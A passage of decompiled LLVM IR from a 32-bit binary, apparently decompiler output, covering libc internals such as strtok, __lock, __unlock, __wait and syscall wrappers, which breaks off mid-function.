  %v0_804ed28 = phi i32 [ %v5_804ed26, %bb92 ], [ %v6_804ed1f, %dec_label_pc_804ed02 ]
  store i32 %storemerge195, i32* %eax.global-to-local, align 4
  %v2_804ed28 = urem i32 %v0_804ed28, 2
  %v3_804ed28 = icmp eq i32 %v2_804ed28, 0
  br i1 %v3_804ed28, label %dec_label_pc_804edf0, label %dec_label_pc_804ed30

dec_label_pc_804ed30:                             ; preds = %bb93
  store i32 %stack_var_-1108.1, i32* %eax.global-to-local, align 4
  %v3_804ed34 = mul nuw nsw i32 %v5_804ed0d, 4
  %v4_804ed34 = add nuw nsw i32 %v3_804ed34, 76
  %v5_804ed34 = add i32 %v4_804ed34, %v0_804ed1f
  %v6_804ed34 = inttoptr i32 %v5_804ed34 to i32*
  %v7_804ed34 = load i32, i32* %v6_804ed34, align 4
  %v8_804ed34 = sub i32 %stack_var_-1108.1, %v7_804ed34
  %v18_804ed34 = icmp eq i32 %v8_804ed34, 0
  store i32 %v8_804ed34, i32* %eax.global-to-local, align 4
  br i1 %v18_804ed34, label %dec_label_pc_804ed60, label %dec_label_pc_804ed3a

dec_label_pc_804ed3a:                             ; preds = %dec_label_pc_804ed30
  br i1 %v1_804ed3e, label %dec_label_pc_804ed54, label %dec_label_pc_804ed42

dec_label_pc_804ed42:                             ; preds = %dec_label_pc_804ed3a
  %v1_804ed46 = icmp eq i32 %stack_var_-1116.0, 0
  br i1 %v1_804ed46, label %dec_label_pc_804ed54, label %dec_label_pc_804ed4a

dec_label_pc_804ed4a:                             ; preds = %dec_label_pc_804ed42
  %tmp198 = icmp ugt i32 %stack_var_-1084.3, %v8_804ed34
  br i1 %tmp198, label %dec_label_pc_804ed50, label %dec_label_pc_804ed54

dec_label_pc_804ed50:                             ; preds = %dec_label_pc_804ed4a
  store i32 %v5_804ecdb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed54

dec_label_pc_804ed54:                             ; preds = %dec_label_pc_804ed4a, %dec_label_pc_804ed42, %dec_label_pc_804ed3a, %dec_label_pc_804ed50
  %v1_804ed54 = phi i32 [ %v8_804ed34, %dec_label_pc_804ed4a ], [ %v8_804ed34, %dec_label_pc_804ed42 ], [ %v8_804ed34, %dec_label_pc_804ed3a ], [ %v5_804ecdb, %dec_label_pc_804ed50 ]
  %v2_804ed54 = add i32 %v1_804ed54, %v0_804edf0
  store i32 %v2_804ed54, i32* @ebx, align 4
  br label %dec_label_pc_804ecf2

dec_label_pc_804ed60:                             ; preds = %dec_label_pc_804ed30
  %v7_804ed68 = icmp ult i32 %stack_var_-1116.0, %v3_804edc3
  %v1_804ed6a = icmp eq i1 %v7_804ed68, false
  br i1 %v1_804ed6a, label %dec_label_pc_804ed6e, label %dec_label_pc_804ed6c

dec_label_pc_804ed6c:                             ; preds = %dec_label_pc_804ed60
  br label %dec_label_pc_804ed6e

dec_label_pc_804ed6e:                             ; preds = %dec_label_pc_804ed60, %dec_label_pc_804ed6c
  %v1_804ed80 = phi i32 [ %stack_var_-1116.0, %dec_label_pc_804ed60 ], [ %v3_804edc3, %dec_label_pc_804ed6c ]
  %v0_804ed6e = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ed6e = add i32 %v0_804ed6e, %v1_804ed80
  %v3_804ed6e = inttoptr i32 %v2_804ed6e to i8*
  %v4_804ed6e = load i8, i8* %v3_804ed6e, align 1
  %v5_804ed6e = zext i8 %v4_804ed6e to i32
  store i32 %v5_804ed6e, i32* %eax.global-to-local, align 4
  %v4_804ed73 = icmp eq i8 %v4_804ed6e, 0
  br i1 %v4_804ed73, label %dec_label_pc_804edb0, label %dec_label_pc_804ed77

dec_label_pc_804ed77:                             ; preds = %dec_label_pc_804ed6e
  %v4_804ed77 = add i32 %v1_804ed80, %v0_804edf0
  %v5_804ed77 = inttoptr i32 %v4_804ed77 to i8*
  %v6_804ed77 = load i8, i8* %v5_804ed77, align 1
  %v17_804ed77 = icmp eq i8 %v4_804ed6e, %v6_804ed77
  %v1_804ed7a = icmp eq i1 %v17_804ed77, false
  br i1 %v1_804ed7a, label %dec_label_pc_804ee56, label %dec_label_pc_804ed80

dec_label_pc_804ed80:                             ; preds = %dec_label_pc_804ed77
  store i32 %v4_804ed77, i32* @ecx, align 4
  br label %dec_label_pc_804eda3

dec_label_pc_804ed89:                             ; preds = %dec_label_pc_804eda3
  %v1_804ed89 = add i32 %v0_804ed90, 1
  %v2_804ed89 = inttoptr i32 %v1_804ed89 to i8*
  %v3_804ed89 = load i8, i8* %v2_804ed89, align 1
  store i32 %v1_804ed89, i32* @ecx, align 4
  store i32 %v4_804eda3, i32* %eax.global-to-local, align 4
  %v16_804ed99 = icmp eq i8 %v3_804eda3, %v3_804ed89
  %v1_804ed9d = icmp eq i1 %v16_804ed99, false
  br i1 %v1_804ed9d, label %dec_label_pc_804ee56, label %dec_label_pc_804eda3

dec_label_pc_804eda3:                             ; preds = %dec_label_pc_804ed89, %dec_label_pc_804ed80
  %v0_804ed90 = phi i32 [ %v1_804ed89, %dec_label_pc_804ed89 ], [ %v4_804ed77, %dec_label_pc_804ed80 ]
  %v0_804eda7 = phi i32 [ %v1_804eda7, %dec_label_pc_804ed89 ], [ %v1_804ed80, %dec_label_pc_804ed80 ]
  %v0_804ed8d = phi i32 [ %v1_804eda3, %dec_label_pc_804ed89 ], [ %v2_804ed6e, %dec_label_pc_804ed80 ]
  %v1_804eda3 = add i32 %v0_804ed8d, 1
  %v2_804eda3 = inttoptr i32 %v1_804eda3 to i8*
  %v3_804eda3 = load i8, i8* %v2_804eda3, align 1
  %v4_804eda3 = zext i8 %v3_804eda3 to i32
  %v1_804eda7 = add i32 %v0_804eda7, 1
  store i32 %v4_804eda3, i32* %eax.global-to-local, align 4
  %v4_804edac = icmp eq i8 %v3_804eda3, 0
  %v1_804edae = icmp eq i1 %v4_804edac, false
  br i1 %v1_804edae, label %dec_label_pc_804ed89, label %dec_label_pc_804edb0

dec_label_pc_804edb0:                             ; preds = %dec_label_pc_804eda3, %dec_label_pc_804ed6e
  br i1 %v1_804ed6a, label %dec_label_pc_804ede8, label %dec_label_pc_804edba

dec_label_pc_804edba:                             ; preds = %dec_label_pc_804edb0
  store i32 %v1_804ed06, i32* @ecx, align 4
  %v3_804edbe = add i32 %v2_804edbe, %v0_804ed6e
  %v4_804edbe = inttoptr i32 %v3_804edbe to i8*
  %v5_804edbe = load i8, i8* %v4_804edbe, align 1
  %v6_804edbe = zext i8 %v5_804edbe to i32
  store i32 %v6_804edbe, i32* %eax.global-to-local, align 4
  %v4_804edc3 = add i32 %v1_804ed06, %v3_804edc3
  %v5_804edc3 = inttoptr i32 %v4_804edc3 to i8*
  %v6_804edc3 = load i8, i8* %v5_804edc3, align 1
  %v17_804edc3 = icmp eq i8 %v5_804edbe, %v6_804edc3
  br i1 %v17_804edc3, label %dec_label_pc_804eddf, label %dec_label_pc_804ee69

dec_label_pc_804edd0:                             ; preds = %dec_label_pc_804eddf
  %v2_804edd0 = add i32 %v0_804eddf, -2
  %v3_804edd0 = add i32 %v2_804edd0, %v0_804ed6e
  %v4_804edd0 = inttoptr i32 %v3_804edd0 to i8*
  %v5_804edd0 = load i8, i8* %v4_804edd0, align 1
  %v6_804edd0 = zext i8 %v5_804edd0 to i32
  store i32 %v6_804edd0, i32* %eax.global-to-local, align 4
  %v5_804edd5 = add i32 %v2_804edd0, %v0_804edf0
  %v6_804edd5 = inttoptr i32 %v5_804edd5 to i8*
  %v7_804edd5 = load i8, i8* %v6_804edd5, align 1
  %v18_804edd5 = icmp eq i8 %v5_804edd0, %v7_804edd5
  %v1_804edd9 = icmp eq i1 %v18_804edd5, false
  br i1 %v1_804edd9, label %dec_label_pc_804ee69, label %dec_label_pc_804eddf

dec_label_pc_804eddf:                             ; preds = %dec_label_pc_804edba, %dec_label_pc_804edd0
  %v0_804eddf = phi i32 [ %v1_804eddf, %dec_label_pc_804edd0 ], [ %v3_804edc3, %dec_label_pc_804edba ]
  %v1_804eddf = add i32 %v0_804eddf, -1
  %v10_804ede2 = icmp ult i32 %stack_var_-1116.0, %v1_804eddf
  br i1 %v10_804ede2, label %dec_label_pc_804edd0, label %dec_label_pc_804ede8

dec_label_pc_804ede8:                             ; preds = %dec_label_pc_804edb0, %dec_label_pc_804eddf
  br label %dec_label_pc_804e94a

dec_label_pc_804edf0:                             ; preds = %bb93
  %v5_804edf0 = add i32 %v0_804edf0, %stack_var_-1100.0
  store i32 %v5_804edf0, i32* @ebx, align 4
  br label %dec_label_pc_804ecf2

dec_label_pc_804ee01:                             ; preds = %dec_label_pc_804ecf2
  %v3_804ee18 = inttoptr i32 %stack_var_-1076.0 to i8*
  %v4_804ee18 = call i32 @memchr(i8* %v3_804ee18, i32 0, i32 %v1_804ece7)
  store i32 %v4_804ee18, i32* %eax.global-to-local, align 4
  %v1_804ee1d = icmp eq i32 %v4_804ee18, 0
  br i1 %v1_804ee1d, label %dec_label_pc_804ee49, label %dec_label_pc_804ee21

dec_label_pc_804ee21:                             ; preds = %dec_label_pc_804ee01
  %v1_804ee25 = load i32, i32* @ebx, align 4
  %v2_804ee25 = sub i32 %v4_804ee18, %v1_804ee25
  store i32 %v2_804ee25, i32* %eax.global-to-local, align 4
  %tmp199 = icmp ugt i32 %stack_var_-1108.1, %v2_804ee25
  br i1 %tmp199, label %dec_label_pc_804ee31, label %dec_label_pc_804ed02

dec_label_pc_804ee31:                             ; preds = %dec_label_pc_804ee21
  br label %dec_label_pc_804e94a

dec_label_pc_804ee38:                             ; preds = %dec_label_pc_804ec89
  %v5_804ee3c = sub i32 %stack_var_-1108.1, %stack_var_-1084.2
  br label %dec_label_pc_804ecd1

dec_label_pc_804ee49:                             ; preds = %dec_label_pc_804ee01
  %v5_804ee4d = add i32 %stack_var_-1076.0, %v1_804ece7
  %v0_804ed06.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ed02

dec_label_pc_804ee56:                             ; preds = %dec_label_pc_804ed89, %dec_label_pc_804ed77
  %v0_804ee56 = phi i32 [ %v1_804ed80, %dec_label_pc_804ed77 ], [ %v1_804eda7, %dec_label_pc_804ed89 ]
  %v5_804ee56 = sub i32 %v0_804ee56, %stack_var_-1112.1
  %v2_804ee62 = add i32 %v5_804ee56, %v0_804edf0
  store i32 %v2_804ee62, i32* @ebx, align 4
  br label %dec_label_pc_804ecf2

dec_label_pc_804ee69:                             ; preds = %dec_label_pc_804edd0, %dec_label_pc_804edba
  %v5_804ee6d = add i32 %v0_804edf0, %stack_var_-1084.3
  store i32 %v5_804ee6d, i32* @ebx, align 4
  br label %dec_label_pc_804ecf2

; uselistorder directives
  uselistorder i32 %v5_804ee6d, { 1, 0 }
  uselistorder i32 %v2_804ee62, { 1, 0 }
  uselistorder i32 %v1_804ee25, { 1, 0 }
  uselistorder i32 %v4_804ee18, { 1, 2, 3, 0 }
  uselistorder i32 %v5_804edf0, { 1, 0 }
  uselistorder i32 %v1_804eddf, { 1, 0 }
  uselistorder i32 %v0_804eddf, { 1, 0 }
  uselistorder i32 %v4_804eda3, { 1, 0 }
  uselistorder i8 %v3_804eda3, { 1, 2, 0 }
  uselistorder i32 %v1_804eda3, { 1, 0 }
  uselistorder i32 %v1_804ed89, { 1, 0, 2 }
  uselistorder i32 %v0_804ed6e, { 0, 2, 1 }
  uselistorder i32 %v1_804ed80, { 2, 3, 0, 1 }
  uselistorder i32 %v2_804ed54, { 1, 0 }
  uselistorder i32 %v8_804ed34, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v8_804ed14, { 1, 0 }
  uselistorder i32 %v1_804ed06, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-1076.1, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804edf0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %stack_var_-1116.0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-1084.3, { 1, 0, 2 }
  uselistorder i32 %stack_var_-1084.2, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1112.1, { 3, 0, 1, 2 }
  uselistorder i32 %v3_804edc3, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_804ec6a, { 1, 0 }
  uselistorder i32 %v1_804ec67, { 1, 0, 2 }
  uselistorder i8 %v4_804ec1e, { 1, 0 }
  uselistorder i8 %v4_804ec19, { 1, 0, 2 }
  uselistorder i32 %v2_804ec09, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ec58, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-1080.0.ph, { 2, 0, 1 }
  uselistorder i32 %v1_804ec0943, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1096.0.ph, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804eb9c, { 1, 0 }
  uselistorder i32 %v2_804eb9c118133, { 1, 0 }
  uselistorder i32 %v1_804ebcb, { 1, 0 }
  uselistorder i32 %v2_804eb9c118, { 1, 0 }
  uselistorder i8 %v4_804ebb1, { 1, 0 }
  uselistorder i8 %v4_804ebac, { 1, 0, 2 }
  uselistorder i32 %v0_804ebeb128, { 1, 0, 2 }
  uselistorder i32 %v2_804eb9c129, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v1_804eb9c33143, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %stack_var_-1084.0.ph144, { 1, 0, 2 }
  uselistorder i32 %stack_var_-1112.0.ph160, { 0, 1, 2, 4, 3 }
  uselistorder i32 %stack_var_-1108.1, { 9, 0, 7, 6, 1, 5, 8, 10, 11, 12, 3, 4, 2 }
  uselistorder i32 %v5_804eb7d, { 1, 0 }
  uselistorder i32 %v0_804eb79, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804eb5d, { 1, 0 }
  uselistorder i32 %v4_804eb58, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804eb4e, { 1, 0, 2 }
  uselistorder i32 %v2_804eac8, { 1, 0 }
  uselistorder i32 %v2_804eac4, { 1, 0 }
  uselistorder i32 %v1_804eab8, { 1, 0 }
  uselistorder i32 %v0_804eabe, { 1, 0 }
  uselistorder i32 %v2_804eaa4, { 1, 0 }
  uselistorder i32 %v2_804ea9b, { 1, 0 }
  uselistorder i32 %v2_804ea92, { 1, 0 }
  uselistorder i32 %v2_804ea8a, { 1, 0 }
  uselistorder i32 %v2_804ea81, { 1, 0 }
  uselistorder i32 %v2_804ea75, { 1, 0 }
  uselistorder i32 %v2_804ea48, { 1, 0 }
  uselistorder i32 %v1_804ea38, { 1, 2, 0 }
  uselistorder i32 %v0_804ea41, { 1, 0 }
  uselistorder i32 %v2_804ea24, { 1, 0 }
  uselistorder i32 %v2_804ea1c, { 1, 0 }
  uselistorder i32 %v2_804ea08, { 1, 0 }
  uselistorder i32 %v2_804e9d7, { 1, 0 }
  uselistorder i32 %v2_804e9d3, { 1, 0 }
  uselistorder i32 %v1_804e9c7, { 1, 2, 0 }
  uselistorder i32 %v2_804e9b2, { 1, 0 }
  uselistorder i32 %v2_804e9a7, { 1, 0 }
  uselistorder i32 %v3_804e97a, { 4, 1, 5, 2, 6, 3, 7, 8, 9, 10, 0 }
  uselistorder i32 %v0_804e94a, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 3, 5, 4, 6, 8, 7, 9, 10, 11, 12, 0, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 2, 47, 49, 48 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ede8, { 1, 0 }
  uselistorder label %dec_label_pc_804eddf, { 1, 0 }
  uselistorder label %dec_label_pc_804ed6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ed54, { 3, 0, 1, 2 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %dec_label_pc_804ed02, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ecc2, { 1, 0 }
  uselistorder label %dec_label_pc_804ec89, { 1, 0 }
  uselistorder label %dec_label_pc_804ec09, { 1, 0 }
  uselistorder label %dec_label_pc_804ec09.outer3, { 1, 0 }
  uselistorder label %dec_label_pc_804ebf2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804eba5, { 1, 0 }
  uselistorder label %dec_label_pc_804eba5.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804eba5.lr.ph.lr.ph, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_804eb4e, { 1, 0 }
  uselistorder label %dec_label_pc_804eab4, { 1, 0 }
  uselistorder label %dec_label_pc_804ea30, { 1, 0 }
  uselistorder label %dec_label_pc_804e9dc, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10 }
  uselistorder label %dec_label_pc_804e9be, { 1, 0 }
  uselistorder label %dec_label_pc_804e94a, { 6, 7, 8, 0, 1, 2, 9, 10, 11, 3, 4, 5 }
}

define i32 @strtok(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %v0_804ee80 = load i32, i32* @esi, align 4
  %v0_804ee81 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %tmp7, i32* @esi, align 4
  %v1_804ee8d = icmp eq i32 %arg1, 0
  br i1 %v1_804ee8d, label %dec_label_pc_804eef7, label %dec_label_pc_804ee91

dec_label_pc_804ee91:                             ; preds = %dec_label_pc_804eef7, %entry
  %v0_804ee91 = phi i32 [ %v1_804eef7, %dec_label_pc_804eef7 ], [ %arg1, %entry ]
  %v4_804ee91 = inttoptr i32 %v0_804ee91 to i8*
  %v4_804ee98 = call i32 @strspn(i8* %v4_804ee91, i32 %tmp7)
  store i32 %v4_804ee98, i32* %eax.global-to-local, align 4
  %v0_804ee9d = load i32, i32* @ebx, align 4
  %v2_804ee9d = add i32 %v0_804ee9d, %v4_804ee98
  store i32 %v2_804ee9d, i32* @ebx, align 4
  %v1_804ee9f = inttoptr i32 %v2_804ee9d to i8*
  %v2_804ee9f = load i8, i8* %v1_804ee9f, align 1
  %v3_804ee9f = icmp eq i8 %v2_804ee9f, 0
  br i1 %v3_804ee9f, label %dec_label_pc_804eee3, label %dec_label_pc_804eea4

dec_label_pc_804eea4:                             ; preds = %dec_label_pc_804ee91
  %v0_804eea4 = load i32, i32* @esi, align 4
  %v4_804eeab = call i32 @strcspn(i8* %v1_804ee9f, i32 %v0_804eea4)
  %v1_804eeb0 = load i32, i32* @ebx, align 4
  %v2_804eeb0 = add i32 %v1_804eeb0, %v4_804eeab
  store i32 %v2_804eeb0, i32* %eax.global-to-local, align 4
  %v1_804eeb2 = inttoptr i32 %v2_804eeb0 to i8*
  store i8* %v1_804eeb2, i8** @global_var_8056dfc.372, align 4
  %v2_804eeb7 = load i8, i8* %v1_804eeb2, align 1
  %v3_804eeb7 = icmp eq i8 %v2_804eeb7, 0
  %v1_804eeba = icmp eq i1 %v3_804eeb7, false
  br i1 %v1_804eeba, label %dec_label_pc_804eed0, label %dec_label_pc_804eebc

dec_label_pc_804eebc:                             ; preds = %dec_label_pc_804eea4
  store i8* null, i8** @global_var_8056dfc.372, align 4
  br label %dec_label_pc_804eec6

dec_label_pc_804eec6:                             ; preds = %dec_label_pc_804eef7, %dec_label_pc_804eebc
  %v0_804eec6 = phi i32 [ %v1_804eef7, %dec_label_pc_804eef7 ], [ %v1_804eeb0, %dec_label_pc_804eebc ]
  store i32 %v0_804eec6, i32* %eax.global-to-local, align 4
  store i32 %v0_804ee81, i32* @ebx, align 4
  store i32 %v0_804ee80, i32* @esi, align 4
  ret i32 %v0_804eec6

dec_label_pc_804eed0:                             ; preds = %dec_label_pc_804eea4
  store i8 0, i8* %v1_804eeb2, align 1
  %v0_804eed3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eed3 = add i32 %v0_804eed3, 1
  %v1_804eed6 = inttoptr i32 %v1_804eed3 to i8*
  store i8* %v1_804eed6, i8** @global_var_8056dfc.372, align 4
  %v0_804eedb = load i32, i32* @ebx, align 4
  store i32 %v0_804eedb, i32* %eax.global-to-local, align 4
  store i32 %v0_804ee81, i32* @ebx, align 4
  store i32 %v0_804ee80, i32* @esi, align 4
  ret i32 %v0_804eedb

dec_label_pc_804eee3:                             ; preds = %dec_label_pc_804ee91
  store i32 0, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_8056dfc.372, align 4
  store i32 %v0_804ee81, i32* @ebx, align 4
  store i32 %v0_804ee80, i32* @esi, align 4
  ret i32 0

dec_label_pc_804eef7:                             ; preds = %entry
  %v0_804eef7 = load i8*, i8** @global_var_8056dfc.372, align 4
  %v1_804eef7 = ptrtoint i8* %v0_804eef7 to i32
  store i32 %v1_804eef7, i32* @ebx, align 4
  %v1_804eefd = icmp eq i8* %v0_804eef7, null
  %v1_804eeff = icmp eq i1 %v1_804eefd, false
  br i1 %v1_804eeff, label %dec_label_pc_804ee91, label %dec_label_pc_804eec6

; uselistorder directives
  uselistorder i32 %v1_804eef7, { 2, 1, 0 }
  uselistorder i32 %v0_804eec6, { 1, 0 }
  uselistorder i32 %v1_804eeb0, { 1, 0 }
  uselistorder i32 %v0_804ee81, { 2, 1, 0 }
  uselistorder i32 %v0_804ee80, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8** @global_var_8056dfc.372, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp3, i32* %stack_var_-12, align 4
  %v0_804ef04 = load i32, i32* @edi, align 4
  %v0_804ef05 = load i32, i32* @ebx, align 4
  store i32 %tmp1, i32* @edx, align 4
  %v2_804ef0d = load i32, i32* %arg1, align 4
  %v1_804ef0f = icmp eq i32 %v2_804ef0d, 0
  br i1 %v1_804ef0f, label %dec_label_pc_804ef47, label %dec_label_pc_804ef13

dec_label_pc_804ef13:                             ; preds = %entry
  store i32 0, i32* %arg1, align 4
  %v0_804ef1c = load i32, i32* @edx, align 4
  %v1_804ef1c = add i32 %v0_804ef1c, 4
  %v2_804ef1c = inttoptr i32 %v1_804ef1c to i32*
  %v3_804ef1c = load i32, i32* %v2_804ef1c, align 4
  %v1_804ef1f = icmp eq i32 %v3_804ef1c, 0
  br i1 %v1_804ef1f, label %dec_label_pc_804ef47, label %dec_label_pc_804ef23

dec_label_pc_804ef23:                             ; preds = %dec_label_pc_804ef13
  store i32 240, i32* @ebx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v1_804ef34 = call i32 @__vsyscall(i32 %tmp3)
  %v10_804ef39 = icmp eq i32 %v1_804ef34, -38
  %v1_804ef3c = icmp eq i1 %v10_804ef39, false
  br i1 %v1_804ef3c, label %dec_label_pc_804ef47, label %dec_label_pc_804ef3e

dec_label_pc_804ef3e:                             ; preds = %dec_label_pc_804ef23
  %v0_804ef3e = load i32, i32* @ebx, align 4
  store i32 %v0_804ef3e, i32* @eax, align 4
  %v0_804ef42 = load i32, i32* %stack_var_-12, align 4
  %v1_804ef42 = call i32 @__vsyscall(i32 %v0_804ef42)
  br label %dec_label_pc_804ef47

dec_label_pc_804ef47:                             ; preds = %dec_label_pc_804ef23, %dec_label_pc_804ef13, %entry, %dec_label_pc_804ef3e
  %v2_804ef47 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804ef05, i32* @ebx, align 4
  store i32 %v0_804ef04, i32* @edi, align 4
  ret i32 %v2_804ef47

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef47, { 3, 0, 1, 2 }
}

define i32 @__lock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %v0_804ef4b = load i32, i32* @esi, align 4
  %v0_804ef4c = load i32, i32* @ebx, align 4
  %v0_804ef50 = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %tmp6, i32* @ebx, align 4
  %v1_804ef59 = icmp eq i32 %v0_804ef50, 0
  %v1_804ef5b = add i32 %tmp6, 4
  store i32 %v1_804ef5b, i32* @esi, align 4
  %v1_804ef5e = icmp eq i1 %v1_804ef59, false
  br i1 %v1_804ef5e, label %dec_label_pc_804ef70.preheader, label %dec_label_pc_804ef7b

dec_label_pc_804ef70.preheader:                   ; preds = %entry
  %v2_804ef7516 = load i32, i32* %arg1, align 4
  store i32 1, i32* %arg1, align 4
  %v1_804ef7717 = icmp eq i32 %v2_804ef7516, 0
  %v1_804ef7919 = icmp eq i1 %v1_804ef7717, false
  br i1 %v1_804ef7919, label %dec_label_pc_804ef62, label %dec_label_pc_804ef7b

dec_label_pc_804ef62:                             ; preds = %dec_label_pc_804ef70.preheader, %dec_label_pc_804ef62
  %v0_804ef66 = load i32, i32* @esi, align 4
  %v0_804ef67 = load i32, i32* @ebx, align 4
  %v4_804ef68 = inttoptr i32 %v0_804ef67 to i32*
  %v5_804ef68 = call i32 @__wait(i32* %v4_804ef68, i32 %v0_804ef66, i32 1)
  %v0_804ef75.pre = load i32, i32* @ebx, align 4
  %v1_804ef75 = inttoptr i32 %v0_804ef75.pre to i32*
  %v2_804ef75 = load i32, i32* %v1_804ef75, align 4
  store i32 1, i32* %v1_804ef75, align 4
  %v1_804ef77 = icmp eq i32 %v2_804ef75, 0
  %v1_804ef79 = icmp eq i1 %v1_804ef77, false
  br i1 %v1_804ef79, label %dec_label_pc_804ef62, label %dec_label_pc_804ef70.dec_label_pc_804ef7b.loopexit_crit_edge

dec_label_pc_804ef70.dec_label_pc_804ef7b.loopexit_crit_edge: ; preds = %dec_label_pc_804ef62
  br label %dec_label_pc_804ef7b

dec_label_pc_804ef7b:                             ; preds = %dec_label_pc_804ef70.preheader, %dec_label_pc_804ef70.dec_label_pc_804ef7b.loopexit_crit_edge, %entry
  %v0_804ef7e = phi i32 [ %v0_804ef50, %entry ], [ %v2_804ef75, %dec_label_pc_804ef70.dec_label_pc_804ef7b.loopexit_crit_edge ], [ %v2_804ef7516, %dec_label_pc_804ef70.preheader ]
  store i32 %v0_804ef4c, i32* @ebx, align 4
  store i32 %v0_804ef4b, i32* @esi, align 4
  ret i32 %v0_804ef7e

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @__wait, { 6, 0, 1, 2, 4, 5, 3 }
  uselistorder label %dec_label_pc_804ef7b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ef62, { 1, 0 }
}

define i32 @__syscall_cp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v1_804ef80 = call i32 (i32, ...) @sccp(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804ef80
}

define i32 @sccp(i32 %sysno, ...) local_unnamed_addr {
entry:
  %v0_804ef85 = call i32 @__syscall()
  ret i32 %v0_804ef85
}

define i32 @__wait(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %tmp19 = ptrtoint i32* %arg1 to i32
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v0_804ef8d = load i32, i32* @edi, align 4
  %v0_804ef8f = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* @ebx, align 4
  store i32 %tmp19, i32* %ebp.global-to-local, align 4
  %v1_804ef9b = icmp eq i32 %tmp20, 0
  br i1 %v1_804ef9b, label %dec_label_pc_804efa4, label %dec_label_pc_804ef9f

dec_label_pc_804ef9f:                             ; preds = %entry
  store i32 128, i32* @ebx, align 4
  br label %dec_label_pc_804efa4

dec_label_pc_804efa4:                             ; preds = %entry, %dec_label_pc_804ef9f
  %v4_804efcf = icmp eq i32 %arg2, 0
  %v1_804efc7 = inttoptr i32 %arg2 to i32*
  br label %dec_label_pc_804efb6

dec_label_pc_804efab:                             ; preds = %dec_label_pc_804efc3, %dec_label_pc_804efbc
  %v2_804efab = load i32, i32* %arg1, align 4
  %v15_804efae = icmp eq i32 %v2_804efab, %arg3
  %v1_804efb2 = icmp eq i1 %v15_804efae, false
  br i1 %v1_804efb2, label %dec_label_pc_804f01a.loopexit, label %dec_label_pc_804efb6

dec_label_pc_804efb6:                             ; preds = %dec_label_pc_804efab, %dec_label_pc_804efa4
  %v0_804efb6 = phi i32 [ %v1_804efb6, %dec_label_pc_804efab ], [ 100, %dec_label_pc_804efa4 ]
  %v1_804efb6 = add nsw i32 %v0_804efb6, -1
  %v10_804efb7 = icmp eq i32 %v0_804efb6, 0
  br i1 %v10_804efb7, label %dec_label_pc_804efcf, label %dec_label_pc_804efbc

dec_label_pc_804efbc:                             ; preds = %dec_label_pc_804efb6
  br i1 %v4_804efcf, label %dec_label_pc_804efab, label %dec_label_pc_804efc3

dec_label_pc_804efc3:                             ; preds = %dec_label_pc_804efbc
  %v2_804efc7 = load i32, i32* %v1_804efc7, align 4
  %v1_804efc9 = icmp eq i32 %v2_804efc7, 0
  br i1 %v1_804efc9, label %dec_label_pc_804efab, label %dec_label_pc_804efd6.loopexit

dec_label_pc_804efcf:                             ; preds = %dec_label_pc_804efb6
  br i1 %v4_804efcf, label %dec_label_pc_804f003.preheader, label %dec_label_pc_804efd6

dec_label_pc_804efd6.loopexit:                    ; preds = %dec_label_pc_804efc3
  br label %dec_label_pc_804efd6

